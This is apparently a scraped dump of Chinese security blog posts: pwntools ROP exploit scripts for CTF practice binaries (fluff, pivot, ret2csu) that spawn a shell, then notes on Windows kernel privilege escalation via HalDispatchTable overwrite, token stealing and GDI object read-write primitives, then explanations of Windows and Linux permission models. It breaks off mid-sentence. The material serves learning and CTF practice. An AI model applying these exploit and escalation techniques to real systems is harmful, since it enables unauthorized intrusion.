payload += p32(xor_edx_edx)+p32(deadbeaf) payload += p32(pop_ebx) payload += p32(addr) payload += p32(xor_edx_ebx)+p32(deadbeaf) payload += p32(xchg_edx_ecx)+p32(deadbeaf) # edx = data payload += p32(xor_edx_edx)+p32(deadbeaf) payload += p32(pop_ebx) payload += data payload += p32(xor_edx_ebx)+p32(deadbeaf) # ptr[ecx]=data payload += p32(mov_ptr_ecx_edx)+p32(deadbeaf)+p32(0) return payloaddeadbeaf = 0xdeafbeafpayload = b'a'*44payload += payload_write(binsh[0:4],data_addr)payload += payload_write(binsh[4:],data_addr+4)payload += p32(system_addr)+p32(deadbeaf)+p32(data_addr)p.recvuntil('&gt;')p.sendline(payload)p.interactive()x64#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162'''0000000000400820 &lt;questionableGadgets&gt;: 400820: 41 5f pop %r15 400822: 4d 31 db xor %r11,%r11 400825: 41 5e pop %r14 400827: bf 50 10 60 00 mov $0x601050,%edi 40082c: c3 retq 40082d: 41 5e pop %r14 40082f: 4d 31 e3 xor %r12,%r11 400832: 41 5c pop %r12 400834: 41 bd 60 40 60 00 mov $0x604060,%r13d 40083a: c3 retq 40083b: bf 50 10 60 00 mov $0x601050,%edi 400840: 4d 87 d3 xchg %r10,%r11 400843: 41 5f pop %r15 400845: 41 bb 50 20 60 00 mov $0x602050,%r11d 40084b: c3 retq 40084c: 41 5f pop %r15 40084e: 4d 89 1a mov %r11,(%r10) 400851: 41 5d pop %r13 400853: 41 5c pop %r12 400855: 45 30 22 xor %r12b,(%r10) 400858: c3 retq 400859: 0f 1f 80 00 00 00 00 nopl 0x0(%rax)'''from pwn import *context.log_level = 'debug'p = process('./fluff')elf = ELF('./fluff')system_addr = elf.symbols['system']data_addr = 0x601050xor_r11_r11 = 0x400822xor_r11_r12 = 0x40082fxchg_r11_r10 = 0x400840mov_ptr_r10_r11 = 0x40084epop_r12 = 0x400832deadbeaf = 0xdeadbeafpayload = b'a'*40binsh = b'/bin/sh\\x00'# r10 = addrpayload += p64(xor_r11_r11)+p64(deadbeaf)payload += p64(pop_r12)payload += p64(data_addr)payload += p64(xor_r11_r12)+p64(deadbeaf)payload += p64(xchg_r11_r10)+p64(deadbeaf)# r11 = datapayload += p64(xor_r11_r11)+p64(deadbeaf)payload += p64(pop_r12)payload += binshpayload += p64(xor_r11_r12)+p64(deadbeaf)# [r10] =r11payload += p64(mov_ptr_r10_r11)+p64(deadbeaf)+p64(0)payload += p64(0x4008c3)+p64(data_addr)+p64(system_addr)p.recvuntil('&gt;')p.sendline(payload)p.interactive()pivot#栈溢出长度太短，因此选择通过stack pivoting达成利用x86#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context.log_level = 'debug''''080488c0 &lt;usefulGadgets&gt;: 80488c0: 58 pop %eax 80488c1: c3 ret 80488c2: 94 xchg %eax,%esp 80488c3: c3 ret 80488c4: 8b 00 mov (%eax),%eax 80488c6: c3 ret 80488c7: 01 d8 add %ebx,%eax 80488c9: c3 ret 80488ca: 66 90 xchg %ax,%ax 80488cc: 66 90 xchg %ax,%ax 80488ce: 66 90 xchg %ax,%ax'''p = process('./pivot32')elf = ELF('./pivot32')libp = ELF('./libpivot32.so')foothold_function_plt = elf.plt['foothold_function']foothold_function_got = elf.got['foothold_function']foothold_function_addr = libp.symbols['foothold_function']ret2win_addr = libp.symbols['ret2win']offset = ret2win_addr - foothold_function_addrpop_eax= 0x80488c0xchg_esp_eax = 0x80488c2mov_ptr_eax_eax = 0x80488c4add_eax_ebx = 0x80488c7call_eax = 0x80486a3pop_ebx=0x8048571leave_ret = 0x80486a8p.recvuntil('The Old Gods kindly bestow upon you a place to pivot: ')pivot_addr = int(p.recv(10),16)print(hex(pivot_addr))payload = b''payload += p32(foothold_function_plt)payload += p32(pop_eax)payload += p32(foothold_function_got)payload += p32(mov_ptr_eax_eax)payload += p32(pop_ebx)payload += p32(offset)payload += p32(add_eax_ebx)payload += p32(call_eax)p.sendline(payload)p.recv()payload = b'a'*40payload += p32(pivot_addr-4)payload += p32(leave_ret)p.sendline(payload)p.interactive()x64#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = 'debug''''0000000000400ae2 &lt;uselessFunction&gt;: 400ae2: 55 push %rbp 400ae3: 48 89 e5 mov %rsp,%rbp 400ae6: b8 00 00 00 00 mov $0x0,%eax 400aeb: e8 60 fd ff ff callq 400850 &lt;foothold_function@plt&gt; 400af0: bf 01 00 00 00 mov $0x1,%edi 400af5: e8 86 fd ff ff callq 400880 &lt;exit@plt&gt; 400afa: 66 0f 1f 44 00 00 nopw 0x0(%rax,%rax,1)0000000000400b00 &lt;usefulGadgets&gt;: 400b00: 58 pop %rax 400b01: c3 retq 400b02: 48 94 xchg %rax,%rsp 400b04: c3 retq 400b05: 48 8b 00 mov (%rax),%rax 400b08: c3 retq 400b09: 48 01 e8 add %rbp,%rax 400b0c: c3 retq 400b0d: 0f 1f 00 nopl (%rax)'''p = process('./pivot')elf = ELF('./pivot')libp = ELF('./libpivot.so')foothold_function_plt = elf.plt['foothold_function']foothold_function_got = elf.got['foothold_function']foothold_function_addr = libp.symbols['foothold_function']ret2win_addr = libp.symbols['ret2win']offset = ret2win_addr - foothold_function_addrpop_rax= 0x400b00xchg_rsp_rax = 0x400b02mov_ptr_rax_rax = 0x400b05add_rax_rbp = 0x400b09call_rax = 0x40098epop_rbp=0x400900leave_ret = 0x400ae0p.recvuntil('The Old Gods kindly bestow upon you a place to pivot: ')pivot_addr = int(p.recv(14),16)print(hex(pivot_addr))payload = b''payload += p64(foothold_function_plt)payload += p64(pop_rax)payload += p64(foothold_function_got)payload += p64(mov_ptr_rax_rax)payload += p64(pop_rbp)payload += p64(offset)payload += p64(add_rax_rbp)payload += p64(call_rax)p.sendline(payload)p.recv()payload = b'a'*40payload += p64(pop_rax)payload += p64(pivot_addr)payload += p64(xchg_rsp_rax)p.sendline(payload)p.interactive()ret2csu#ret2csu，原理参考ctf-wiki，中级ROP章节。但是在pwnme函数中，将GOT表都置零了，所以需要先调用frame_init进行初始化x64#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *'''0xdeadcafebabebeef'''''' 400880: 4c 89 fa mov %r15,%rdx 400883: 4c 89 f6 mov %r14,%rsi 400886: 44 89 ef mov %r13d,%edi 400889: 41 ff 14 dc callq *(%r12,%rbx,8) 40088d: 48 83 c3 01 add $0x1,%rbx 400891: 48 39 dd cmp %rbx,%rbp 400894: 75 ea jne 400880 &lt;__libc_csu_init+0x40&gt; 400896: 48 83 c4 08 add $0x8,%rsp 40089a: 5b pop %rbx 40089b: 5d pop %rbp 40089c: 41 5c pop %r12 40089e: 41 5d pop %r13 4008a0: 41 5e pop %r14 4008a2: 41 5f pop %r15 4008a4: c3 retq'''p = process('./ret2csu')rdx=0xdeadcafebabebeefinit = 0x600E10csu_1 = 0x400880csu_2 = 0x40089aret2win = 0x4007B1payload = 0x20*b'a'payload += p64(0) #rbppayload += p64(csu_2)payload += p64(0) #rbxpayload += p64(1) #rbppayload += p64(init) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(rdx) #r15payload += p64(csu_1)payload += p64(0) #add rsp,8payload += p64(0) #rbxpayload += p64(0) #rbppayload += p64(0) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0) #r15payload += p64(ret2win)p.sendline(payload)p.interactive()","link":"/77e17aac.html"},{"title":"windows提权基础知识","text":"调研调研，真的不想再调研了，淦！HalDispatchTable#HalDispatchTable作为内核中的一个表，在windows内核提权中十分有用因为它是一个存在于内核态的系统调用表，当我们获得任意地址写的能力后，可以使用shellcode地址覆盖偏移为4的函数HalQuerySystemInformation，然后调用NtQueryIntervalProfile函数，即可通过该表调用shellcode，之所以选择覆盖这个函数，是因为它没有什么用，覆盖后不会使内核崩溃当漏洞可以获得任意地址写任意值的能力时，可以利用HalDispatchTable进行利用利用过程：找ntkrnlpa.exe地址：使用EnumDeviceDrivers函数枚举所有的设备驱动地址，找到名为ntkrnlpa.exe驱动的地址计算HalDispatchTable：使用LoadLibraryExA函数加载ntkrnlpa.exe到内存，然后使用GetProcAddress函数获得HalDispatchTable的地址覆盖HalQuerySystemInformation地址为shellcode地址shellcode替换windows token提权windows token#Windows token是windows下控制进程、线程权限的重要标志Token和进程相关联， 每个进程创建时都会根据Logon Session权限由LSA（Local Security Authority)分配一个Token(如果CreaeProcess时自己指定了Token, LSA会用该Token， 否则就用父进程Token的一份拷贝,由大部分进程是由Explorer.exe创建， 所以我们大部分时候都复制了explorer.exe的Token)， 里面含有该进程的安全信息，包括用户帐号， 组信息， 权限信息和默认安全描述符(Security Descriptor)等， 我们可以通过GetTokenInformation查询某个Token的详细情况。因此，如果我们可以替换当前进程的token为系统权限级token，就获得了提权。利用过程：保存当前寄存器状态找到当前进程的token并保存利用system进程的pid找到system进程的token用system进程的token替换当前进程的token具体替换代码可参考payload.c一些相关的函数：CreateProcess：使用当前登录用户的token创建进程CreateProcessAsUser，CreateProcessWithTokenW：以某用户的token创建进程，具体token可以通过LogonUser登录用户账户获得OpenProcessToken、 OpenThreadToken：得到当前进程、线程的tokenGetTokenInformation：获取token中的信息AdjustTokenPrivileges：修改token改变权限具体见微软文档：https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-tokens?redirectedfrom=MSDNwindows 10 1607之前 —— BitMap#BitMap是windows内核利用中一个被经常应用到的结构CreateBitMap创建了SURFACE OBJECT，包含结构BASEOBJECT和SURFOBJ，变量pvScan0，其中pvScan0指向内核中的一块数据区域Pixel Data其中Pixel Data可以使用函数GetBitmapBits和SetBitmapBits进行控制因此，如果能够篡改某个(术语 worker bitmap)bitmap的pvScan0的值为任意的值的话, 就能获取向任意地址读和写的权限.利用流程：调用 CreateBitmap 创建 bitmap 内核对象通过 teb 获得 pvScan0 的地址fs 在用户模式下指向 teb，通过 NtCurrentTeb 来获得 teb 的基址teb 中的 ProcessEnvironmentBlock 指向线程所在的进程 pebpeb 偏移 0x094 的地方（x86下）是一个指向 GDICELL 结构体数组的指针 GdiSharedHandleTableAddr通过 CreateBitmap 返回的 handle 值可以得到该 bitmap 的 GDICELL 结构体的索引DWORD32 pKernelAddress = GdiSharedHandleTableAddr + ((DWORD32) handle &amp; 0xffff) * (x86:0x10,x64:0x18);(只对windows 10 1607 前有效)pKernelAddress指向BASEOBJECT的第一个字节，因此pvScan0 = (PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38)1234567891011/// 32bit size: 0x10/// 64bit size: 0x18typedef struct _GDI_CELL{ IntPtr pKernelAddress; UInt16 wProcessId; UInt16 wCount; UInt16 wUpper; UInt16 wType; IntPtr pUserAddress;}通过任意地址写漏洞改写 pvScan0 的值为想要读/写的地址调用 GetBitmapBits /SetBitmapBits来读/写数据一般通过两个BitMap进行利用：创建两个 bitmap，分别为 hManager 和 hWorker通过任意地址写漏洞改写 hManager 的 pvScan0 的值为 hWorker 的 pvScan0 的地址结合 GetBitmapBits 和 SetBitmapBits，利用 hManager 和 hWorker 读取 system 的 token把 system 的 token 赋予我们的当前进程windows 10 1607 —— Accelerator table#在windows 10 1607版本中，BitMap的问题被暂时缓解，无法通过之前的pKernelAddress以及一系列偏移计算定位到pvScan0的地址可以想到的两个基本思路：寻找其它方法来泄露 bitmap GDI 对象的地址寻找 bitmap 的替代方案Windows 中存在着 3 种类型的对象，分别为 user object、GDI object、Kernel object，一共有 40 多种对象区别：Event 对象属于 Kernel object，存在于非换页池中bitmap 对象属于 GDI object，存在于换页会话池中Accelerator table 对象，属于 user object，也存在于换页会话池中由于bitmap对象和Accelerator table都存在于换页会话池，因此可以考虑用Bitmap对象重用故意释放的Accelerator table的空间，也就等同于获得了Bitmap对象的地址获得Accelerator table的地址User.dll模块中存在全局变量 gSharedInfogSharedInfo的第二个变量 aheList 指向USER_HANDLE_ENTRY表对象USER_HANDLE_ENTRY表对象第一个参数pKernel ，指向该 user object 在内核空间中的位置Accelerator table属于 user object ，因此可以找到对应的地址让BitMap获得地址：第一种：在池中释放掉一块空间，并且之后分配同等大小的空间时，内存管理器是倾向于分配同一块空间给它第二种：通过 pool fengshui 的方法来提高分配的稳定性windows 10 1703 —— lpszMenuName#和之前一样，微软为了不让找到到pvScan0还是想办法去获得BitMap，禁用了使用USER_HANDLE_ENTRY中的pKernel进行索引的方法lpszMenuName关联一个window的windows窗口对象, 其在内核当中对应结构体对象为tagWNDtagCLS对应于windows窗口类，其中一个对象是lpszManuName如果可以泄露lpszManuName地址，就可以通过wndclass.lpszMenuName控制对应内存的大小tagWND对应一个桌面堆. 内核的桌面堆会映射到用户态去. HMValidateHandle能够获取这个映射的地址. 在这个映射(head.pSelf)当中存储着当前tagWND对象的内核地址. 而HMValidateHandle函数的地址未导出, 不过在导出的IsMenu函数有使用, 所以可以通过硬编码的形式找到它.因此利用过程如下：pIsMenu —&gt; pHMValidateHandle —&gt; pWnd = HMValidateHandle(hWnd,1)，返回tagWND对象指针，用户桌面堆地址pSelf=pWnd+0x20，得到内核桌面堆地址kernelTagCLS=pWnd+0xa8，得到内核TagCLS地址userTagCLS=kernelTagCLS-ulClientDelta，取得用户TagCLS地址，lpszMenuName位于0x90偏移处(该处指向paged pool)配一个比较长的窗口窗口菜单名，再释放掉，然后再申请一个Bitmap将会从用刚才释放的块Windows 10 1707 —— Palette#在这个版本，微软意识到BitMap才是问题的根源，于是选择将Bitmap header与Bitmap data部分分离，无法再通过Bitmap header取得pvscan0指针的内核地址通过分析，大哥们发现Palette的结构完全可以实现之前BitMap的效果，因此选择使用Pallette进行利用12345678910111213141516171819202122typedef struct _PALETTE64{ BASEOBJECT64 BaseObject; // 0x00 FLONG flPal; // 0x18 ULONG32 cEntries; // 0x1C ULONG32 ulTime; // 0x20 HDC hdcHead; // 0x24 ULONG64 hSelected; // 0x28, ULONG64 cRefhpal; // 0x30 ULONG64 cRefRegular; // 0x34 ULONG64 ptransFore; // 0x3c ULONG64 ptransCurrent; // 0x44 ULONG64 ptransOld; // 0x4C ULONG32 unk_038; // 0x38 ULONG64 pfnGetNearest; // 0x3c ULONG64 pfnGetMatch; // 0x40 ULONG64 ulRGBTime; // 0x44 ULONG64 pRGBXlate; // 0x48 PALETTEENTRY *pFirstColor; // 0x80 struct _PALETTE *ppalThis; // 0x88 PALETTEENTRY apalColors[3]; // 0x90}PALETTE偏移0x90处是PALETTEENTRY，相当于BitMap中的pixel Data偏移0x80处的pFirstColor是一个指向PALETTEENTRY的指针，相当于BitMap中的pvScan0利用：在bitmap中GetBitmapBits、SetBitmapBits用来操纵Pixel Data在Palette中，使用GetPaletteEntrie和SetPaletteEntrie操纵PALETTEENTRY具体如下图Pool风水#有的时候对利用过程中对象的地址并非绝对掌握，但是通过堆风水，可以让这些对象的相对位置确定，通过在内存中布置大量的对象，提高利用的稳定性具体阅读：https://xz.aliyun.com/t/3146参考#https://www.cnblogs.com/weiym/p/3280313.htmlhttps://50u1w4y.github.io/site/HEVD/bitmap/https://paper.seebug.org/876/https://xz.aliyun.com/t/3430https://www.anquanke.com/post/id/168441https://bbs.pediy.com/thread-224158.htmhttps://xz.aliyun.com/t/3146https://bbs.pediy.com/user-home-530966.htmhttps://github.com/hatRiot/token-privhttps://www.anquanke.com/post/id/168572https://50u1w4y.github.io/site/HEVD/bitmap/","link":"/2acbaae3.html"},{"title":"windows权限管理机制","text":"Windows 通过相互关联的身份验证和授权机制来控制系统资源和网络资源的使用。 对用户进行身份验证后，Windows 操作系统使用内置授权和访问控制技术来实现保护资源的第二阶段：确定经过身份验证的用户是否具有访问资源的正确权限。基本概念#对象：包括文件、文件夹、打印机、注册表项和 Active Directory 域服务 (AD DS) 对象权限：授予用户或组的访问权限类型，例如，可以授予 Finance 组对名为 Payroll.dat 的文件的读取和写入权限。对象所有权：创建对象时，会向该对象分配所有者。 默认情况下，所有者是对象的创建者。 无论对对象设置了哪些权限，该对象的所有者始终都可以更改权限。权限继承：继承允许管理员轻松分配和管理权限， 例如，文件夹中的文件继承文件夹的权限用户权限：向计算环境中的用户和组授予的特定权限和登录权限，管理员可以将特定权限分配给组帐户或单个用户帐户动态访问控制：如果用户的作业或角色发生更改，则用户的权限会动态更改认证机制#操作系统密码存储于%SystemRoot%\\system32\\config\\SAM文件中在登录时，winlogon.exe接收到账号密码后，会将密码交给lsass进程，这个进程会将明文密码加密成NTLM Hash，与SAM文件中的账号密码进行比较认证用户账户控制#Windows账户分类：SYSTEM：拥有系统最高权限Administrators 用户组：Administrator管理员账户：比SYSTEM低，是用户最高权限，在权限上与Administrator一样，但是在访问令牌管理上有所不同Users 用户组标准账户显式的区别Administrator/管理员账户/标准账户：Administrator：可直接运行高权限程序，无弹窗管理员账户：在运行高权限程序时，有弹窗确认标准账户：要求输入管理员账号和密码Windows token 管理#Windows Token即Access Token(访问令牌)，不同的用户登录计算机后会生成一个Access Token，token在用户创建进程或线程时会进行拷贝和分配。Windows Access Token主要组成用户账户的SID；用户所属组的SID；登陆SID，标识当前登陆会话；用户和用户组特权列表；用户创建的进程的默认DACL；access token类型和来源；其他信息；123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100kd&gt; !process 81464da8 1PROCESS 81464da8 SessionId: 0 Cid: 03bc Peb: 7ffdf000 ParentCid: 0124 DirBase: 0dec2000 ObjectTable: e1a31198 TableSize: 275. Image: MSMSGS.EXE VadRoot 81468cc0 Vads 170 Clone 0 Private 455. Modified 413. Locked 0. DeviceMap e1958438 Token e1bed030 ElapsedTime 0:44:15.0142 UserTime 0:00:00.0290 KernelTime 0:00:00.0300 QuotaPoolUsage[PagedPool] 49552 QuotaPoolUsage[NonPagedPool] 10872 Working Set Sizes (now,min,max) (781, 50, 345) (3124KB, 200KB, 1380KB) PeakWorkingSetSize 1550 VirtualSize 57 Mb PeakVirtualSize 57 Mb PageFaultCount 2481 MemoryPriority BACKGROUND BasePriority 8 CommitCharge 2497kd&gt; !exts.token -n e1bed030_TOKEN e1bed030TS Session ID: 0User: S-1-5-21-518066528-515770016-299552555-2981724 (User: MYDOMAIN\\myuser)Groups: 00 S-1-5-21-518066528-515770016-299552555-513 (Group: MYDOMAIN\\Domain Users) Attributes - Mandatory Default Enabled 01 S-1-1-0 (Well Known Group: localhost\\Everyone) Attributes - Mandatory Default Enabled 02 S-1-5-32-544 (Alias: BUILTIN\\Administrators) Attributes - Mandatory Default Enabled Owner 03 S-1-5-32-545 (Alias: BUILTIN\\Users) Attributes - Mandatory Default Enabled 04 S-1-5-21-518066528-515770016-299552555-2999049 (Group: MYDOMAIN\\AllUsers) Attributes - Mandatory Default Enabled 05 S-1-5-21-518066528-515770016-299552555-2931095 (Group: MYDOMAIN\\SomeGroup1) Attributes - Mandatory Default Enabled 06 S-1-5-21-518066528-515770016-299552555-2931096 (Group: MYDOMAIN\\SomeGroup2) Attributes - Mandatory Default Enabled 07 S-1-5-21-518066528-515770016-299552555-3014318 (Group: MYDOMAIN\\SomeGroup3) Attributes - Mandatory Default Enabled 08 S-1-5-21-518066528-515770016-299552555-3053352 (Group: MYDOMAIN\\Another Group) Attributes - Mandatory Default Enabled 09 S-1-5-21-518066528-515770016-299552555-2966661 (Group: MYDOMAIN\\TestGroup) Attributes - Mandatory Default Enabled 10 S-1-5-21-2117033040-537160606-1609722162-17637 (Group: MYOTHERDOMAIN\\someusers) Attributes - Mandatory Default Enabled 11 S-1-5-21-518066528-515770016-299552555-3018354 (Group: MYDOMAIN\\TestGroup2) Attributes - Mandatory Default Enabled 12 S-1-5-21-518066528-515770016-299552555-3026602 (Group: MYDOMAIN\\SomeGroup4) Attributes - Mandatory Default Enabled 13 S-1-5-21-518066528-515770016-299552555-2926570 (Group: MYDOMAIN\\YetAnotherGroup) Attributes - Mandatory Default Enabled 14 S-1-5-21-661411660-2927047998-133698966-513 (Group: MYDOMAIN\\Domain Users) Attributes - Mandatory Default Enabled 15 S-1-5-21-518066528-515770016-299552555-2986081 (Alias: MYDOMAIN\\an_alias) Attributes - Mandatory Default Enabled GroupResource 16 S-1-5-21-518066528-515770016-299552555-3037986 (Alias: MYDOMAIN\\AReallyLongGroupName1) Attributes - Mandatory Default Enabled GroupResource 17 S-1-5-21-518066528-515770016-299552555-3038991 (Alias: MYDOMAIN\\AReallyLongGroupName2) Attributes - Mandatory Default Enabled GroupResource 18 S-1-5-21-518066528-515770016-299552555-3037999 (Alias: MYDOMAIN\\AReallyLongGroupName3) Attributes - Mandatory Default Enabled GroupResource 19 S-1-5-21-518066528-515770016-299552555-3038983 (Alias: MYDOMAIN\\AReallyReallyLongGroupName) Attributes - Mandatory Default Enabled GroupResource 20 S-1-5-5-0-71188 (no name mapped) Attributes - Mandatory Default Enabled LogonId 21 S-1-2-0 (Well Known Group: localhost\\LOCAL) Attributes - Mandatory Default Enabled 22 S-1-5-4 (Well Known Group: NT AUTHORITY\\INTERACTIVE) Attributes - Mandatory Default Enabled 23 S-1-5-11 (Well Known Group: NT AUTHORITY\\Authenticated Users) Attributes - Mandatory Default EnabledPrimary Group: S-1-5-21-518066528-515770016-299552555-513 (Group: MYDOMAIN\\Domain Users)Privs: 00 0x000000017 SeChangeNotifyPrivilege Attributes - Enabled Default 01 0x000000008 SeSecurityPrivilege Attributes - 02 0x000000011 SeBackupPrivilege Attributes - 03 0x000000012 SeRestorePrivilege Attributes - 04 0x00000000c SeSystemtimePrivilege Attributes - 05 0x000000013 SeShutdownPrivilege Attributes - 06 0x000000018 SeRemoteShutdownPrivilege Attributes - 07 0x000000009 SeTakeOwnershipPrivilege Attributes - 08 0x000000014 SeDebugPrivilege Attributes - 09 0x000000016 SeSystemEnvironmentPrivilege Attributes - 10 0x00000000b SeSystemProfilePrivilege Attributes - 11 0x00000000d SeProfileSingleProcessPrivilege Attributes - 12 0x00000000e SeIncreaseBasePriorityPrivilege Attributes - 13 0x00000000a SeLoadDriverPrivilege Attributes - Enabled 14 0x00000000f SeCreatePagefilePrivilege Attributes - 15 0x000000005 SeIncreaseQuotaPrivilege Attributes - 16 0x000000019 SeUndockPrivilege Attributes - Enabled 17 0x00000001c SeManageVolumePrivilege Attributes -Authentication ID: (0,11691)Impersonation Level: AnonymousTokenType: PrimarySource: User32 TokenFlags: 0x9 ( Token in use )Token ID: 18296 ParentToken ID: 0Modified ID: (0, 18298)RestrictedSidCount: 0 RestrictedSids: 00000000按完整性高低可以分为四类：System：对应 SYSTEM 用户拥有的最高权限，系统进程以 SYSTEM 用户启动，拿到 System 令牌High：对应 Administrators 组拥有的最高权限，用来管理计算机，可以修改其他用户，可以修改系统的设置Medium：对应 Users 组拥有的最高权限，用于日常使用Low：为了更小权限而设置的，例如IE使用该权限启动网页，避免恶意攻击对本地资源产生过多影响细看不同账户区别：管理员账户，如果启动一个普通进程，那么此进程在管理员账户下运行，获得的是 Medium 访问令牌。当此进程提升权限，将弹出 UAC 提示框，用户同意后继续使用此同一个管理员账户运行，但子进程将获得 High 访问令牌。标准账户，如果启动一个普通进程，那么此进程在标准账户下运行，获得的是 Medium 访问令牌。当此进程提升权限，将弹出 UAC 提示框，用户输入管理员账号密码后，子进程将在输入的管理员账户下运行，获得此管理员的 High 访问令牌安全标识符SID#SID用于唯一标识安全主体或安全组SID永远都是唯一的，由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定，以保证它的唯一性每个帐户或组，或在帐户的安全上下文中运行的进程都有唯一SID，存储在安全数据库中，当 SID 用作用户或组的唯一标识符时，它永远不会再次用于标识其他用户或组。本地帐户或组的 SID 由计算机上本地安全机构 (LSA) 生成，并与其他帐户信息一起存储在注册表的安全区域中。 域帐户或组的 SID 由域安全机构生成，并存储为 Active Directory 域服务中的 User 或 Group 对象的属性。用户每次登录时，系统会为该用户创建访问令牌。 访问令牌包含用户的 SID、用户权限以及用户所属的任何组的 SID。 此令牌为用户在此计算机上执行的任何操作提供安全上下文。对于每个本地帐户和组，SID 对于创建它的计算机是唯一的。 计算机上没有任何两个帐户或组共享同一 SID。 同样，对于每个域帐户和组，SID 在企业中是唯一的。123456typedef struct _SID { UCHAR Revision; // 标识SID版本 UCHAR SubAuthorityCount; SID_IDENTIFIER_AUTHORITY IdentifierAuthority; //最高级别签发机构 ULONG SubAuthority[ANYSIZE_ARRAY]; //中间签发者} SID, *PISID;访问令牌#有两种类型的访问令牌，即主令牌和模拟令牌。 每个进程都有一个主令牌，用于描述与进程关联的用户帐户的安全上下文。 通常会将主访问令牌分配给一个进程，以表示该进程的默认安全信息。 另一方面，模拟令牌通常用于客户端和服务器方案。 模拟令牌使线程在不同于拥有该线程的进程的安全上下文的安全上下文中运行。过程：当用户以交互方式登录或尝试与运行 Windows 的计算机建立网络连接时，登录过程会对用户凭据进行身份验证。 如果身份验证成功，此过程将返回用户的 SID 和用户的安全组的 SID 列表。计算机上本地安全 (LSA) 使用此信息创建访问令牌 (在这种情况下，主访问令牌) 。 这包括登录过程返回的 ID 以及本地安全策略分配给用户和用户的安全组的用户权限列表LSA 创建主访问令牌后，访问令牌的副本将附加到代表用户执行的每一个线程和进程。 每当线程或进程与安全对象交互或尝试执行需要用户权限的系统任务时，操作系统都会检查与该线程关联的访问令牌以确定授权级别。安全描述符#安全描述符是一种与每个安全对象关联的数据结构。 Active Directory 中的所有对象以及本地计算机或网络上的所有安全对象都有安全描述符，以帮助控制对对象的访问。安全描述符包括有关谁拥有对象、谁可以访问该对象以及以什么方式访问以及审核哪些类型的访问的信息分为DACL和SACL：选择访问控制列表DACL：用于标识允许或拒绝访问的用户和组系统访问控制列表SACL：用于控制如何审核访问权限123456789typedef struct _SECURITY_DESCRIPTOR { UCHAR Revision; UCHAR Sbz1; SECURITY_DESCRIPTOR_CONTROL Control; PSID Owner; // PSID Group; PACL Sacl; //系统访问控制列表，是用来做审计用的，一般不用关心 PACL Dacl; //自主访问控制列表，记录了哪些用户可以(/不可以)以何种方式访问该对象 } SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;每个ACL都由一系列ACE元素组成，ACE中包含以下信息：1、谁对你有权限2、是允许还是拒绝3、有什么权限4、这个权限能不能被继承授权和访问控制过程#当进程打开一个对象时，会从进程token中获取用户名和用户所在组列表，与对象安全描述符的中的DACL比较对象的DACL==Null，则进程拥有完全的访问权限。对象的DACL不为Null，但是AceCount ==0（ACE,访问控制项），则拒绝任何进程访问。遍历DACL，找到跟令牌中用户或组一致的Ace，如果该Ace指明没有拥有制定的访问权限，则直接退出安全检查函数，并拒绝该进程访问。遍历DACL，没找到跟令牌中用户或组一致的Ace，并拒绝该进程访问。遍历DACL，找到跟令牌中用户或组一致的Ace，如果该Ace指明拥有制定的访问权限，则直接退出安全检查函数，并允许该进程访问。参考资料#https://docs.microsoft.com/zh-cn/windows/security/identity-protection/http://www.youngroe.com/2015/08/14/Windows/Windows-Permissions-Privilege/https://blog.csdn.net/Ga4ra/article/details/102509417https://www.cnblogs.com/guomeiran/p/4152857.htmlhttps://blog.walterlv.com/post/windows-user-account-control.htmlhttps://cloud.tencent.com/developer/article/1622153https://www.cnblogs.com/zpchcbd/p/12932451.htmlhttps://github.com/helpsystems/GDIObjDumphttps://juejin.cn/post/6844903572618887176","link":"/e2c44604.html"},{"title":"linux权限管理机制","text":"包括文件管理机制和进程权限管理机制RWX 文件权限控制#权限对文件的影响对目录的影响r（读取）可读取文件内容可列出目录内容w（写入）可以修改文件内容可在目录创建、删除文件x（执行）可以作为命令执行可访问目录内容1位：文件类型2-4位：User权限5-7位：Group权限8-10位：Other权限ACL文件权限控制#是在UGO+RWX权限控制的基础上实现的更灵活的权限管理机制ACL设置流程ACL权限检查进程权限凭证cred#12345678910111213141516171819202122232425262728293031323334353637 struct cred { atomic_t usage; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif uid_t uid; /* real UID of the task */ gid_t gid; /* real GID of the task */ uid_t suid; /* saved UID of the task */ gid_t sgid; /* saved GID of the task */ uid_t euid; /* effective UID of the task */ gid_t egid; /* effective GID of the task */ uid_t fsuid; /* UID for VFS ops */ gid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ #ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */ struct thread_group_cred *tgcred; /* thread-group shared credentials */ #endif #ifdef CONFIG_SECURITY void *security; /* subjective LSM security */ #endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* cached user-&gt;user_ns */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */};123超级用户 root（0）程序用户（1~499）普通用户（500~65535）cred结构主要为了控制进程权限而存在，这里需要区分一些id：uid 是创建进程的用户的ideuid 是进程运行过程中实时的id（比如有的时候需要暂时切换进入内核态执行，然后再退回用户态）suid 